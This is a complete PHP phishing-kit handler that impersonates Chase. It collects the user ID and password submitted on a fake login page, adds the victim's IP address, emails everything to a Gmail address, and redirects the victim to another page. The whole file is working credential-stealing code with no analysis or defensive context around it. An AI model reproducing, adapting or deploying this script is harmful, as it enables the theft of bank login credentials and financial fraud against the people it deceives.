<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || tHAnks tO Crossr!d3r || :------\n";
$message .= "User ID             : ".$_POST['UserID']."\n";
$message .= "Password              : ".$_POST['Password']."\n";
$message .= "----: || tHAnks tO Crossr!d3r || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "mavin0971@gmail.com";
$subject = "Chase ID | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  log.htm");
?>


